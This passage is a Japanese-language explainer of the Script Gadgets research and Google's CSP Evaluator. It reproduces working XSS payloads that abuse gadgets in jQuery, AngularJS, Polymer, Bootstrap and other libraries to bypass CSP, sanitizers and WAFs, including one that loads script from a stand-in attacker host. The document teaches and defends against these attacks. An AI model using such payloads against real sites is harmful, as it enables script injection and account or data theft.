| XSSフィルタ | NoScript | 9 / 16 |
| サニタイザ | DOMPurify | 9 / 16 |
| サニタイザ | Google Closure | 6 / 16 |
| WAF | ModSecurity CRS | 9 / 16 |

この表から読み取れる最重要の教訓は、**「厳格なはずのCSPほど、gadgetの選択肢が広がる場面がある」**という逆説である。`unsafe-eval` を許可すると10/16、`strict-dynamic` に至っては13/16でバイパスが成立した。理由は後述するが、要は「eval系のgadgetを呼べる」「動的に挿入した`<script>`が信頼される」という強い実行能力を、正規ライブラリが提供してしまうからである。

#### 2.2 影響範囲（なぜ気にすべきか）

原典は3つの数字で「これは他人事ではない」と示す。

> - Gadgets are prevalent in **all but one** of the tested popular web frameworks.（テストした人気フレームワークのうち、1つを除く**すべて**にgadgetが蔓延している。）
> - Gadgets are confirmed to exist in **at least 20%** of web applications from Alexa top 5,000.（Alexa上位5,000サイトのうち、**少なくとも20%**にgadgetが存在することを確認した。）
> - Gadgets can be used to bypass **most** mitigations in modern web applications.（現代のWebアプリの**大半**の緩和策をバイパスできる。）

「1つを除くすべて」の「1つ」とは React である（後述のサマリで「React — no gadgets」と明記される）。

> 出典: Breaking XSS mitigations via Script Gadgets — https://blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf

---

### 3. 具体的なgadgetの実例（原典PoCの引用）

ここからは、原典スライドに掲載された**実物のペイロード**を種類別に見ていく。各例で「攻撃者が注入するのは無害なマークアップだけ」「ページ上の正規コードがそれをコード実行に変換する」という共通構造を確認してほしい。

#### 3.1 導入例：架空の「ボタン」ライブラリ

最初にスライドが挙げる教育用の例。ある正規コードが `data-role=button` を持つ要素を探し、その `data-text` 属性値を `.html()`（＝`innerHTML`）で描画するとする。

```html
<div data-role="button" data-text="I am a button"></div>
```
```js
var buttons = $("[data-role=button]");
buttons.html(button.getAttribute("data-text"));   // ← これがScript Gadget
```

正常時は `data-text` の中身がそのままボタン文字列になる。しかし攻撃者が `data-text` にHTMLエンティティ化した`<script>`を仕込むと――

```html
<div data-role="button" data-text="&lt;script&gt;alert(1)&lt;/script&gt;"></div>
```

`getAttribute("data-text")` は属性値をデコードした文字列 `<script>alert(1)</script>` を返し、それが `.html()` に渡って **`<script>` としてDOMに実体化**する。

- **なぜ動くか**: サニタイザは注入されたHTMLの「見た目」しか見ていない。属性値の中の `&lt;script&gt;` はただのテキストであり、`title` や `data-text` のような属性は「安全」として許可される。しかし正規コードが後から `getAttribute` でその値を取り出し、HTMLとして**再パース（パーサ再解釈）**して危険なsink（`innerHTML`）に渡す。この「一度は無害なテキストとして通過したデータが、後段の正規コードで危険な文脈に置き直される」という時間差・経路分離が、静的フィルタの検出網をすり抜ける。

#### 3.2 Knockout：属性値を `eval()` する

Knockout の `data-bind` 属性は、内部で次のように処理される（スライドから抜粋・簡略化）。

```js
switch (node.nodeType) {
  case 1: return node.getAttribute("data-bind");
}
// ...
var rewrittenBindings = ko.expressionRewriting.preProcessBindings(bindingsString, options),
    functionBody = "with($context){with($data||{}){return{" + rewrittenBindings + "}}}";
return new Function("$context", "$element", functionBody);
```

`data-bind` の値がそのまま `new Function(...)` の本体に埋め込まれる。つまり実質的に `data-bind="value: foo"` は `eval("foo")` に等しい。Knockout製アプリをXSSするには、攻撃者はこれだけ注入すればよい。

```html
<div data-bind="value: alert(1)"></div>
```

- **なぜ動くか**: `data-bind` は「UIとデータの紐付け設定」を書く属性であり、サニタイザにとっては無害な`data-*`属性の一種にすぎない。だがKnockoutはその文字列を JavaScript 式として `new Function` でコンパイル・実行する。`<script>` タグも `onerror` も使っていないのに、コード実行に到達する。

#### 3.3 Ajaxify：`<div>` を `<script>` に変換

Ajaxify は `class="document-script"` を持つすべての `<div>` を `<script>` 要素へ変換する。

```html
<div class="document-script">alert(1)</div>
```

> And Ajaxify will do the job for you.（あとはAjaxifyが仕事をしてくれる。）

- **なぜ動くか**: `class` も `<div>` も「無害」の典型。しかしライブラリ側が「このクラスの div は実はスクリプトだ」という独自の規約を持っているため、無害な要素が実行可能スクリプトに昇格する。

#### 3.4 Bootstrap：最もシンプルなgadget（属性値を`innerHTML`へ）

原典が "the simplest gadget"（最もシンプルなgadget）と呼ぶ例。Bootstrap の tooltip は `data-html=true` のとき、`title` 属性の値を `innerHTML` として挿入する。

```html
<div data-toggle=tooltip data-html=true title='<script>alert(1)</script>'>
```

> HTML sanitizers allow the title attribute, because it's usually safe. But they aren't, when used together with Bootstrap and other data-attributes.
> （サニタイザは `title` 属性を許可する。通常は安全だからだ。だがBootstrapや他のdata属性と組み合わさると、そうではなくなる。）

- **なぜ動くか**: `title` はツールチップ文言に使う「安全な」属性としてサニタイザの許可リストにほぼ必ず入っている。Bootstrapは `data-html=true` の指示に従い、その安全なはずの `title` を `innerHTML` に流し込む。属性単体の安全性と、ライブラリと組み合わせた際の危険性が乖離する好例。

#### 3.5 Google Closure：DOM Clobberingでスクリプト元を乗っ取る

Closure は「自分自身のスクリプトURL」を検出し、同じ場所からサブリソースを読み込む。攻撃者は特定の `id` を持つ要素を注入して、その基準パスを混乱させられる。

```html
<a id=CLOSURE_BASE_PATH href=data:/,1/alert(1)//></a>
<form id=CLOSURE_UNCOMPILED_DEFINES>
<input id=goog.ENABLE_CHROME_APP_SAFE_SCRIPT_LOADING></form>
```

- **なぜ動くか**: これは**DOM Clobbering**（別節で詳述）の応用。`id`（や `name`）を持つDOM要素は、`window` や `document` のプロパティとしてJavaScriptから参照可能になる。攻撃者が `id=CLOSURE_BASE_PATH` の要素を置くと、Closureが参照する変数 `CLOSURE_BASE_PATH` がそのDOM要素で「上書き（clobber）」され、`href` の `data:` URI をスクリプトの読み込み元だと誤認する。無害な `<a>`/`<form>`/`<input>` だけで、スクリプトの出所そのものを乗っ取る。この gadget は NoScript のバイパスにも使われた。

#### 3.6 RequireJS：`data-main` で任意モジュールを読ませる

```html
<script data-main='data:1,alert(1)' src='require.js'></script>
```

> RequireJS allows the user to specify the "main" module of a JavaScript file, and it is done through a custom data attribute, of which XSS filters and other mitigations aren't aware of.
> （RequireJSは「main」モジュールをカスタムdata属性で指定できるが、XSSフィルタや他の緩和策はその属性を知らない。）

- **なぜ動くか**: `data-main` は RequireJS 独自の慣習であり、フィルタの危険パターン集に載っていない。RequireJS はその値を「読み込むべきモジュール」として `data:` URI ごと実行する。

#### 3.7 Ember：strict-dynamic の突破

Emberの開発版は、いったん無効なself-closingスクリプトタグから**有効なコピーを作り直して再挿入**する。strict-dynamic CSPは「動的に挿入された`<script>`」を信頼するため、これがバイパスになる。

```html
<script type=text/x-handlebars>
  <script src=//attacker.example.com// />
</script>
```

- **なぜ動くか**: strict-dynamicの信頼モデルは「すでに信頼されたスクリプトが**動的に生成**したスクリプトも信頼する（信頼の伝播）」というもの。Emberが元スクリプトを再構築して `appendChild` 等で挿入する行為は、CSPから見れば「信頼されたコードによる動的挿入」に該当してしまう。攻撃者が静的に置いた `<script>` はブロックされるが、Emberが再挿入したコピーは信頼されて実行される。なお、これは**開発版でのみ**成立する（サマリで "gadgets only in development version" と注記）。

#### 3.8 jQuery：`<form>`+`<input>` でスクリプトを再挿入させる

jQueryは、既存の`<script>`タグを取り出して再挿入するgadgetを持つ。攻撃者は `<form>` と `<input name="ownerDocument">` を注入して、jQueryのロジックを混乱させる。

```html
<form class="child">
<input name="ownerDocument"/><script>alert(1);</script></form>
```

> Strict-dynamic CSP blocks the `<script>`, but then jQuery reinserts it. Now it's trusted and will execute.
> （strict-dynamic CSPは`<script>`をブロックするが、jQueryがそれを再挿入する。すると信頼され、実行される。）

- **なぜ動くか**: 3.7 と同じ「動的挿入は信頼される」原理。`input[name=ownerDocument]` は、jQuery内部で `elem.ownerDocument` を参照する処理を**DOM Clobbering**で乗っ取り、正常なドキュメント判定を狂わせるための仕込みである。

#### 3.9 jQuery Mobile：HTMLコメントを閉じてサニタイザを破る

jQuery Mobile は、要素の `id` 属性値を動的にHTMLコメント内へ埋め込む箇所がある。攻撃者はコメントを閉じるだけで任意コード実行できる。

```html
<div data-role=popup id='--><script>"use strict"
alert(1)</script>'></div>
```

- **なぜ動くか**: `id` 属性は「安全」としてサニタイザを通過する。しかしライブラリがその値を `<!-- ... -->` の内側に文字列連結で差し込むため、値の先頭に `-->` を置けばコメントを早期終了させ、続く `<script>` を実コードとして注入できる。これはサニタイザ（DOMPurifyなど）のバイパスとして機能する。

#### 3.10 Dojo Toolkit：ModSecurity CRS の突破

```html
<div data-dojo-type="dijit/Declaration" data-dojo-props="}-alert(1)-{">
```

- **なぜ動くか**: Dojoは `data-dojo-type`/`data-dojo-props` を宣言的なウィジェット定義として解釈・評価する。`data-*` 属性で構成されているため、ModSecurity CRS（正規表現ベースのWAF）の危険パターンに一致しない。

#### 3.11 Underscore テンプレート：unsafe-eval の突破

```html
<div type=underscore/template> <% alert(1) %> </div>
```

- **なぜ動くか**: Underscoreのテンプレートは `<% %>` の中身を JavaScript として `eval` 相当で実行する。CSPが `unsafe-eval` を許可している環境でのみ成立する（gadgetが `eval` を呼ぶため）。

#### 3.12 式パーサ系gadget：Aurelia / AngularJS / Polymer / Ractive / Vue

最も強力なカテゴリ。これらのフレームワークは **eval を使わず、独自の式パーサ**を持つ。式をトークン化・パース・評価し、JavaScriptに「コンパイル」して実行する。原典の要点はこうだ。

> With sufficiently complex expression language, we can run arbitrary JS code.
> （十分に複雑な式言語があれば、私たちは任意のJSコードを実行できる。）

この「自前の式評価器」があるおかげで、CSPが `unsafe-eval` を禁止していても、**ホスト許可リスト方式でも、nonce方式でも**バイパスが成立しうる。フレームワーク自身がインタプリタを内蔵しているからだ。実物のPoCを見る。

**Aurelia**（新しい`<script>`要素を挿入するプログラムを式言語で記述）:

```html
<div ref="me"
s.bind="$this.me.ownerDocument.createElement('script')"
data-bar="${$this.me.s.src='data:,alert(1)'}"
data-foobar="${$this.me.ownerDocument.body.appendChild($this.me.s)}"></div>
```

**Polymer 1.x**（"private" な `_properties` を上書きしてフレームワークを混乱させる。ヒント：下から上へ読む）:

```html
<template is=dom-bind><div
 five={{insert(me._nodes.0.scriptprop)}}
 four="{{set('insert',me.root.ownerDocument.body.appendChild)}}"
 three="{{set('me',nextSibling.previousSibling)}}"
 two={{set('_nodes.0.scriptprop.src','data:\,alert(1)')}}
 scriptprop={{_factory()}}
 one={{set('_factoryArgs.0','script')}} >
</template>
```

**Polymer 1.x で whitelist / nonce CSP を突破**:

```html
<template is=dom-bind><div
      c={{alert('1',ownerDocument.defaultView)}}
      b={{set('_rootDataHost',ownerDocument.defaultView)}}>
</div></template>
```

**AngularJS 1.6+ で whitelist / nonce CSP を突破**:

```html
<div ng-app ng-csp ng-focus="x=$event.view.window;x.alert(1)">
```

- **なぜ動くか（式パーサ全般）**: これらは `<script>`・`eval`・`javascript:` を一切使わない。フレームワークの**式評価エンジンそのもの**を借用して、`ownerDocument.createElement('script')` や `appendChild`、`$event.view.window.alert` といったDOM/ネイティブAPIをつなぎ、任意処理を組み立てる。CSPは「送信元」も「evalの有無」も見ているが、フレームワーク内蔵インタプリタによる評価は、CSPの監視対象の外にある。`ng-csp` は AngularJS を「CSP互換モード」（`Function`コンストラクタを使わないモード）で動かす属性で、これを付けることで unsafe-eval なしでも AngularJS の式評価が働く点が鍵。

**Ractive で nonce の窃取・再利用**（極めつけ）:

```html
<script id="template" type="text/ractive">
  <iframe srcdoc="
      <script nonce={{@global.document.currentScript.nonce}}>
        alert(1337)
      </{{}}script>">
  </iframe>
</script>
```

- **なぜ動くか**: nonce方式CSPは「サーバが発行した秘密のnonceを持つ`<script>`だけ実行する」。攻撃者はnonceを知らないはずだが、Ractiveの式言語で `document.currentScript.nonce` を読み出し、それを `srcdoc` で生成する子フレーム内の `<script nonce=...>` に**再利用**する。`</{{}}script>` は、式展開で空文字を挟むことでパーサの `</script>` 検出を避けるトリック。これはnonceを「秘密」たらしめる前提を、gadget経由で崩している。

#### 3.13 gadgetのまとめ（16ライブラリ）

調査対象の16ライブラリ:

> AngularJS 1.x, Aurelia, Bootstrap, Closure, Dojo Toolkit, Emberjs, Knockout, Polymer 1.x, Ractive, React, RequireJS, Underscore / Backbone, Vue.js, jQuery, jQuery Mobile, jQuery UI

結論:

> - It turned out they are prevalent（gadgetは蔓延していた）
> - **Only one library did not have a useful gadget**（有用なgadgetを持たなかったのは1つだけ＝React）
> - XSSes in Aurelia, AngularJS (1.x), Polymer (1.x) can bypass **all** mitigations via expression parsers.（Aurelia・AngularJS 1.x・Polymer 1.x のXSSは、式パーサ経由で**すべての**緩和策をバイパスできる。）
> - EmberJS — gadgets only in development version（Emberのgadgetは開発版のみ）

そして手法の集計（framework/mitigation の組合せ）:

> Bypasses in **53.13%** of the framework/mitigation pairs.
> （フレームワーク×緩和策の組合せの **53.13%** でバイパスが成立した。）

> 出典: Breaking XSS mitigations via Script Gadgets — https://blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf

---

### 4. 大規模実測：Alexa上位5,000サイトの実態

論文の後半（Samuel Groß, Martin Johns との共同研究）は、gadgetが**実運用サイトのユーザーランドコード**にも普遍的に存在することを、大規模クロールで示す。

#### 4.1 手法

> We used **taint tracking** to detect data flows from the DOM into sinks. Each data flow represents a potential gadget.
> （テイント追跡で、DOMからsinkへのデータフローを検出した。各データフローは潜在的なgadgetを表す。）

テイント追跡（taint tracking）とは、「攻撃者が制御しうる入力（DOM属性など＝source）」に印（テイント）を付け、それが危険な処理（`innerHTML`・`eval`・`createElement('script')` など＝sink）に到達するかを実行時に追跡する手法。到達した各経路が「gadget候補」になる。イメージはこうだ。

```js
elem.innerHTML = $('#mydiv').attr('data-text');   // data-text(source) → innerHTML(sink)
```
```html
<div id="mydiv" data-text="<script>xssgadget()</script>">
```

クロール対象:

> - Alexa Top 5,000 サイトを1階層深く（one level deep）、同一セカンドレベルドメイン内の全リンクをたどってクロール。

#### 4.2 クロール規模

> - 4,557 の second-level ドメイン、37,232 のサブドメイン、**647,085** 個の個別Webページ

#### 4.3 テイントされたデータフロー

> - **82%** のサイトが、少なくとも1つの関連データフローを持っていた。
> - 1URLあたり平均 **6.72** 回のsink呼び出し、セカンドレベルドメインあたり **450** 回。
> - 総計 **4,352,491** 回のsink呼び出し、**22,379** 個のユニークなgadget候補（ドメイン・sink・sourceの組合せ）。

#### 4.4 緩和策別の潜在gadget

**CSP関連:**
> - **48%** のドメインが、潜在的な `eval` gadget を持つ（＝CSP unsafe-eval が有効なら悪用されうる）。
> - **73%** のドメインが、潜在的な strict-dynamic gadget を持つ（`script.text`/`src` へのフロー、jQueryの`.html()`、`createElement(tainted).text` など）。

**HTMLサニタイザ関連:**
> - **78%** のドメインが、HTML属性からの少なくとも1つのデータフローを持つ。
> - **60%** が `data-*` 属性からのフロー、**16%** が `id` 属性から、**10%** が `class` 属性から。

#### 4.5 実証済みgadget

> - **1,762,823** 個のgadgetベース攻撃候補を生成。
> - そのうち **285,894** 個のgadgetを、**906ドメイン（19.88%）** で実際に有効と検証した。
> - この数字は**下限**であり、実際の数はもっと多いと考えられる。

つまり、「Alexa上位5,000サイトの約20%は、gadget経由で実際にXSS緩和策をバイパスできる状態にあった」ことが、生成・検証の両方で裏付けられた。

> 出典: Breaking XSS mitigations via Script Gadgets — https://blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf

---

### 5. 防御・展望（原典の結論）

原典は「gadgetを潰す」アプローチの限界を率直に述べる。

**緩和策に「gadget対応」を足すのは困難:**
> - ライブラリと式言語が多数存在する。
> - 誤検知（false positive）が避けられない。

**フレームワーク側でgadgetを潰すのも問題:**
> - ライブラリが多すぎる。
> - gadgetはXSS本体より発見が難しいことがある。
> - 開発者は反発する――「これはバグじゃない（XSSこそがバグだ）」。
> - gadgetが**機能そのもの**であることもある（例：式言語）。

**本質的な結論:**
> - A novice programmer, today, cannot write a complex but secure application. The task is getting harder, not easier.（今日、初級プログラマが複雑かつ安全なアプリを書くことはできない。この作業は易しくなるどころか難しくなっている。）
> - We need to make the platform **secure-by-default**（プラットフォームを**デフォルトで安全**にする必要がある）:
>   - 安全なDOM API（Safe DOM APIs）
>   - ブラウザのより良いプリミティブ
>   - ビルド時セキュリティ（例：プリコンパイル済みテンプレート＝Angular 2 の AOT）
> - より良い分離プリミティブ（Suborigins, `<iframe sandbox>`, Isolated scripts）が必要。

この「secure-by-default」への転換の思想は、後年の **Trusted Types**（DOM XSSのsinkを型で縛る仕組み、別節で詳述）や、React/Angular 2+ のような「自動エスケープ・プリコンパイルテンプレート」を持つフレームワークの普及として結実していく。React が唯一 gadget を持たなかったのは偶然ではなく、`dangerouslySetInnerHTML` を明示的に呼ばない限り文字列がHTMLとして解釈されない「デフォルト安全」設計の帰結である。

> 出典: Breaking XSS mitigations via Script Gadgets — https://blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf

---

### 6. Google CSP Evaluator

#### 6.1 ツールの位置づけ

**CSP Evaluator**（https://csp-evaluator.withgoogle.com/、コアライブラリは npm の `csp_evaluator`、ソースは `github.com/google/csp-evaluator`）は、CSPポリシー文字列を貼り付けると、そのポリシーに含まれる**構文的・意味的な弱点**を自動検出し、重大度付きで一覧表示するツール兼ライブラリである。READMEはこう述べる。

> CSP Evaluator ... helps identify subtle CSP bypasses which undermine the value of a policy. CSP Evaluator checks are based on a **large-scale study**.（CSP Evaluatorは、ポリシーの価値を損なう巧妙なCSPバイパスの特定を助ける。検査は**大規模研究**に基づく。）

この「large-scale study」こそ、第4〜5節で見た Script Gadgets の実測研究（および同グループの CSP 導入実態調査 pub45542）である。CSP Evaluator と Script Gadgets 研究が表裏一体、というのはこの意味だ。CSP Evaluator は「gadgetを持つと知られたホストを許可リストに入れていないか」を機械的にチェックする。

- CSPバージョン選択: v3（nonceベース＋後方互換チェック）／v3／v2／v1 の4モード。nonceは v2 以降でのみ有効で、「CSP v1 しかサポートしないブラウザは nonce を無視する」ため、想定するブラウザに応じて評価が変わる。
- Chrome拡張としても提供される。
- 免責: "Google provides no guarantees or warranties for this tool."（公式製品ではない。）

#### 6.2 重大度（Severity）の定義

`finding.ts` の `Severity` enum（数値が小さいほど深刻）:

```
HIGH = 10          // 高（実際にバイパス可能）
SYNTAX = 20        // 構文エラー
MEDIUM = 30        // 中
HIGH_MAYBE = 40    // 高の可能性
STRICT_CSP = 45    // Strict CSPへの改善提案
MEDIUM_MAYBE = 50  // 中の可能性
INFO = 60          // 情報
NONE = 100         // 問題なし
```

#### 6.3 実装されている主な検査項目（ソースからの実物）

以下は `checks/security_checks.ts` と `checks/strictcsp_checks.ts` に実装された検査関数と、**実際の警告メッセージ・重大度**である。原理を添えて読む。

**(1) unsafe-inline（`checkScriptUnsafeInline`）— HIGH**
> "'unsafe-inline' allows the execution of unsafe in-page scripts and event handlers."

`unsafe-inline` はページ上のあらゆるインラインスクリプト・イベントハンドラを許可する。攻撃者が注入したものも区別なく通るため、素朴なXSSすら防げなくなる。CSPの送信元チェック機構そのものを無効化するキーワードなので最高重大度。（`unsafe-hashes` は MEDIUM_MAYBE。）

**(2) unsafe-eval（`checkScriptUnsafeEval`）— MEDIUM_MAYBE**
> "'unsafe-eval' allows the execution of code injected into DOM APIs such as eval()."

`eval()`・`setTimeout("string")`・`new Function(...)` 等の文字列→コード変換を許可する。第3節の Underscore テンプレートや Knockout のような eval系gadget を成立させる前提となる。

**(3) plain URLスキーム（`checkPlainUrlSchemes`）— HIGH**
> "[scheme] URI in [directive] allows the execution of unsafe scripts."

`data:`・`http:` などのスキームを `script-src` に許可すると、`data:` URI で任意スクリプトを持ち込めてしまう（第3節の RequireJS/Aurelia が使った `data:,alert(1)` を想起）。

**(4) ワイルドカード（`checkWildcards`）— HIGH**
> "[directive] should not allow '*' as source"

`*` は事実上あらゆるオリジンを許可し、CSPの意味を消す。

**(5) object-src欠落（`checkMissingObjectSrcDirective`）— HIGH**
> "Missing object-src allows the injection of plugins which can execute JavaScript..."

`<object>`/`<embed>` 経由のコード実行を防ぐため `object-src 'none'` を要求する。

**(6) script-src欠落（`checkMissingScriptSrcDirective`）— HIGH**
> "script-src directive is missing."

`script-src` が無ければスクリプト実行が無制限。

**(7) base-uri欠落（`checkMissingBaseUriDirective`）— HIGH**
> "Missing base-uri allows the injection of base tags. They can be used to set the base URL..."

`base-uri` 未設定だと、攻撃者が `<base href="https://attacker.example/">` を注入して、ページ内の相対パス指定スクリプト（`<script src="/app.js">` 等）の読み込み元を攻撃者サーバへすり替えられる。ブラウザは相対URLを `document.baseURI`（`<base>`で変更可能）基準で解決するため、`script-src 'self'` の「self」の解釈基準そのものが乗っ取られる。`base-uri 'none'` または `'self'` を強く推奨。

**(8) script許可リストバイパス（`checkScriptAllowlistBypass`）— HIGH / MEDIUM_MAYBE**
> - "'self' can be problematic if you host JSONP, AngularJS or user uploaded files." （MEDIUM_MAYBE）
> - "[domain] is known to host [endpoints] which allow to bypass this CSP." （HIGH）
> - "No bypass found; make sure that this URL doesn't serve JSONP replies or Angular libraries." （MEDIUM_MAYBE）

これが Script Gadgets 研究と直結する検査。許可したドメインが、**既知のJSONPエンドポイント**（`jsonp.ts`）や **AngularJS配信URL**（`angular.ts`）を含む場合、名指しで HIGH 警告を出す。原理は「オリジン単位の許可は、そのオリジン上の安全なファイルと危険なファイル（JSONP・gadgetライブラリ）を区別できない」こと。

CSP Evaluator が同梱する既知バイパス一覧（抜粋、実物）:
- JSONP系（`jsonp.ts` の `URLS`）: `//www.google-analytics.com/gtm/js`、`//translate.googleapis.com/translate_a/l`、`//accounts.google.com/o/oauth2/revoke`、`//api.facebook.com/restserver.php`、`//syndication.twitter.com/widgets/timelines/...`、`//www.youtube.com/profile_style`、`//api.vk.com/method/wall.get` など多数。
- eval が必要なJSONP系（`NEEDS_EVAL`）: `googletagmanager.com`、`www.googleadservices.com`、`google-analytics.com` など。
- AngularJS配信（`angular.ts` の `URLS`）: `//ajax.googleapis.com/ajax/libs/angularjs/1.2.0rc1/angular-route.min.js`、`//cdnjs.cloudflare.com/ajax/libs/angular.js/1.2.16/angular.min.js`、`//cdn.jsdelivr.net/angularjs/1.1.2/angular.min.js`、`//www.gstatic.com/fsn/angular_js-bundle1.js` など多数。
- Flash（`flash.ts` の `URLS`）: `//vk.com/swf/video.swf`、`//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf`。

ソースの注記どおり「This list only contains popular bypasses and is by no means complete.（人気のバイパスのみで、網羅的ではない）」――つまり載っていないから安全、とは言えない。

**(9) Flash object許可リストバイパス（`checkFlashObjectAllowlistBypass`）— HIGH / MEDIUM_MAYBE**
> - "[hostname] is known to host Flash files which allow to bypass this CSP." （HIGH）
> - "Can you restrict object-src to 'none' only?" （MEDIUM_MAYBE）

**(10) IPソース（`checkIpSource`）— INFO**
> - "[directive] directive allows localhost as source. ..."
> - "[directive] directive has an IP-Address as source: [host] (will be ignored by browsers!)."

CSPのホストソースにIPアドレスを書いても**ブラウザは無視する**（ホスト名として解釈されない）点への注意喚起。

**(11) 非推奨ディレクティブ（`checkDeprecatedDirective`）— INFO**
> - "reflected-xss is deprecated since CSP2. Please, use the X-XSS-Protection header instead."
> - "referrer is deprecated since CSP2. Please, use the Referrer-Policy header instead."
> - "disown-opener is deprecated since CSP3. ..."
> - "prefetch-src is deprecated since CSP3. ..."

**(12) nonce長・文字集合（`checkNonceLength`）— MEDIUM / INFO**
> - "Nonces should be at least 8 characters long." （MEDIUM）
> - "Nonces should only use the base64 charset." （INFO）

短いnonceは推測されうる。第3節の Ractive のnonce窃取とは別問題だが、「nonceの強度」もCSPの前提であることを示す。

**(13) HTTP送信（`checkSrcHttp`）— MEDIUM**
> "Use HTTPS to send violation reports securely." / "Allow only resources downloaded over HTTPS."

**Strict CSP系（`strictcsp_checks.ts`）— 主に STRICT_CSP（改善提案）:**

**(14) strict-dynamic推奨（`checkStrictDynamic`）— STRICT_CSP**
> "Host allowlists can frequently be bypassed. Consider using 'strict-dynamic' in combination with CSP nonces or hashes."

これがツール全体の中心メッセージ。「**ホスト許可リストは頻繁にバイパスされうる**」――まさに Script Gadgets 研究が実証したこと――ので、nonce/hash と `strict-dynamic` の組合せへ移行せよ、という提案。

**(15) strict-dynamic単独の警告（`checkStrictDynamicNotStandalone`）— INFO**
> "'strict-dynamic' without a CSP nonce/hash will block all scripts."

**(16) 後方互換フォールバック（`checkUnsafeInlineFallback` / `checkAllowlistFallback`）— STRICT_CSP**
> - "Consider adding 'unsafe-inline' (ignored by browsers supporting nonces/hashes) to be backward compatible with older browsers."
> - "Consider adding https: and http: url schemes (ignored by browsers supporting 'strict-dynamic') to be backward compatible with older browsers."

nonce/strict-dynamic対応ブラウザは `unsafe-inline` や `http:/https:` フォールバックを**無視する**という仕様を逆手に取り、旧ブラウザ向けの互換性を安全に確保する定石。

**(17) Trusted Types推奨（`checkRequiresTrustedTypesForScripts`）— INFO**
> "Consider requiring Trusted Types for scripts to lock down DOM XSS injection sinks. You can do this by adding \"require-trusted-types-for 'script'\" to your policy."

Script Gadgets が突いた「DOMのsinkに文字列が流れ込む」問題を、根本から縛る Trusted Types への誘導。原典の "secure-by-default" 提言の実装形である。

#### 6.4 推奨される「Strict CSP」

上記の検査群が最終的に勧める理想形はこうだ。

```
Content-Security-Policy:
  script-src 'nonce-{ランダム値}' 'strict-dynamic' https: 'unsafe-inline';
  object-src 'none';
  base-uri 'none';
  require-trusted-types-for 'script';
```

- **なぜ有効か**: `'strict-dynamic'` はブラウザに**ホスト許可リストを完全に無視**させ、「nonce/hashが一致した信頼スクリプトが動的生成したスクリプトはその信頼を継承する」という**伝播ベースの信頼モデル**へ切り替える。これで「どのホストにgadgetがあるか」という問題設定そのものが消える。`https:` と `'unsafe-inline'` は、nonce非対応の旧ブラウザ向けフォールバック（対応ブラウザは無視）。`base-uri 'none'` は `<base>` すり替えを封じ、`object-src 'none'` はプラグイン経由実行を封じる。`require-trusted-types-for 'script'` はDOM XSSのsinkを型で縛る。逆に言えば、**ホスト許可リスト方式を使い続ける限り、Script Gadgetsによるバイパスの理論的リスクは残る**――これが CSP Evaluator と Black Hat 論文に共通する最終メッセージである。

> 出典: CSP Evaluator（github.com/google/csp-evaluator, checks/security_checks.ts, checks/strictcsp_checks.ts, allowlist_bypasses/*.ts）— https://csp-evaluator.withgoogle.com/

---

### 7. まとめ：この節の核心

- **Script Gadgets研究（Black Hat/CCS 2017）**は、「CSP・サニタイザ・XSSフィルタ・WAFは、構文（タグ・属性・URLスキーム）しか見ておらず、ページ上の正規JavaScriptが持つ『意味』までは検証できない」という構造的限界を、**16ライブラリ・Alexa上位5,000サイト**で実証した。フレームワーク×緩和策の **53.13%** でバイパスが成立し、Alexa上位の約 **20%（906ドメイン）** で実際に有効なgadgetを検証した。
- 特に**式パーサ内蔵フレームワーク（AngularJS 1.x・Aurelia・Polymer 1.x）**は、`<script>`も`eval`も使わずに**すべての**緩和策をバイパスできた。gadgetを唯一持たなかったのは、デフォルト安全設計の **React** だった。
- **CSP Evaluator**は、この研究成果を「機械的に検出できる危険パターン」に落とし込んだ実務ツールである。`unsafe-inline`（HIGH）、広すぎるホスト許可（HIGH）、`base-uri`欠落（HIGH）、そして**既知のJSONP/AngularJS/Flash配信ホストを許可していないか**（HIGH）を具体的に指摘し、最終的に **nonce + strict-dynamic + Trusted Types** の「Strict CSP」へ導く。
- この節の最重要ポイントは、**「CSPを設定した」「サニタイザを通した」という事実だけでは、ページ上に存在する正規コードの挙動まで保証されない**ということ。防御の本質は、緩和策の積み増しではなく、Black Hat論文が説く **secure-by-default**（デフォルトで安全なプラットフォーム／フレームワーク／API）への移行にある。次節以降では、この考え方を発展させ、DOM Clobbering やコード再利用攻撃（Code-Reuse）の具体例をさらに掘り下げる。

---

## コード再利用攻撃（CCS17論文 / Google PoC）

前節（s4j）では、Script Gadgets の考え方とツール（CSP Evaluator / Black Hat 発表）を概観した。本節では、その理論的土台となった査読付き学術論文 **"Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets"（ACM CCS 2017）** を一次資料として精読し、ガジェットの**体系的な分類**、各種XSS対策の**具体的な突破コード**、そして「実際のWebでどれほど蔓延しているか」を測った**大規模実証実験の数値**まで、原典に沿って詳しく解説する。あわせて、これらの攻撃を再現可能な形で公開した **Google の `script-gadgets` PoC リポジトリ**の構造と、フレームワーク別の突破一覧表（bypass matrix）を扱う。

この論文が重要なのは、「CSP・サニタイザ・WAF・ブラウザ内蔵XSSフィルタという当時の4大XSS対策すべてが、原理的に同じ盲点を持つ」ことを、机上の空論ではなく **Alexa 上位5000サイト・約65万ページのクロール**によって定量的に証明した点にある。結論を先に言えば、著者らは「**今日書かれているWebアプリのほとんどのXSS対策はバイパス可能だと想定してよい**」（原文: *we assume most mitigation techniques in web applications written today can be bypassed*）と述べている。

### 1. 論文の位置づけと「コード再利用攻撃」という比喩

著者は Sebastian Lekies、Krzysztof Kotowicz、Eduardo A. Vela Nava（以上 Google）、Samuel Groß、Martin Johns（以上 SAP）。2017年10月、テキサス州ダラスで開催された CCS'17 のセッション "H2: Code Reuse Attacks" で発表された。

論文の中心概念は **script gadget（スクリプトガジェット）**、すなわち「Webページの正規コード（アプリ自身、またはロード済みのライブラリ/フレームワーク）の中に含まれる、**特定の形をしたDOM内容の存在に反応して動作する、小さなJavaScriptコード片**」である。攻撃の流れはこうだ。

1. 攻撃者は、一見無害なHTMLマークアップ（`<script>`もイベントハンドラも`javascript:`も含まない）をページに注入する。
